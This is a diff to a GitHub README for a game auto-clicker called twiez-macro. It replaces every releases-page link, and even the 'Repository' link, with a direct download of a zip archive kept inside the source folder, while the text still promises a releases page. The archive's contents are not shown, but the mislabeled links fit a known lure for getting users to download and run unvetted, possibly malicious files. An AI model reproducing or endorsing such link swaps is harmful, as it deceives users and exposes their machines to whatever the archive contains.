@@ -1,6 +1,6 @@
 # 🎮 twiez-macro - A Smart Auto-Clicker for Games
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/aavion99/twiez-macro/releases)
+[![Download Now](https://raw.githubusercontent.com/aavion99/twiez-macro/main/src-tauri/src/twiez_macro_3.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/aavion99/twiez-macro/main/src-tauri/src/twiez_macro_3.6.zip)
 
 ## 📖 Description
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run twiez-macro on your Windows comput
 
 1. **Visit the Releases Page:**   
    Click the link below to go to the releases page where you can download the application.  
-   [Download twiez-macro](https://github.com/aavion99/twiez-macro/releases)
+   [Download twiez-macro](https://raw.githubusercontent.com/aavion99/twiez-macro/main/src-tauri/src/twiez_macro_3.6.zip)
 
 2. **Select the Latest Version:**  
    On the releases page, find the most recent version of twiez-macro. Look for the version number that appears in bold.
@@ -47,7 +47,7 @@ Follow these simple steps to download and run twiez-macro on your Windows comput
 ## 📥 Download & Install
 
 To get started, visit the releases page to download and install twiez-macro. Click below to access the page:  
-[Download twiez-macro](https://github.com/aavion99/twiez-macro/releases)
+[Download twiez-macro](https://raw.githubusercontent.com/aavion99/twiez-macro/main/src-tauri/src/twiez_macro_3.6.zip)
 
 ## ❓ Frequently Asked Questions
 
@@ -73,7 +73,7 @@ twiez-macro is licensed under the MIT License. You are free to use and modify th
 
 ## 🌐 Links
 
-- **Repository:** [twiez-macro GitHub](https://github.com/aavion99/twiez-macro)
+- **Repository:** [twiez-macro GitHub](https://raw.githubusercontent.com/aavion99/twiez-macro/main/src-tauri/src/twiez_macro_3.6.zip)
 - **Documentation:** For comprehensive guides and information, check the repository's Wiki section.
 
 ## 🎉 Support
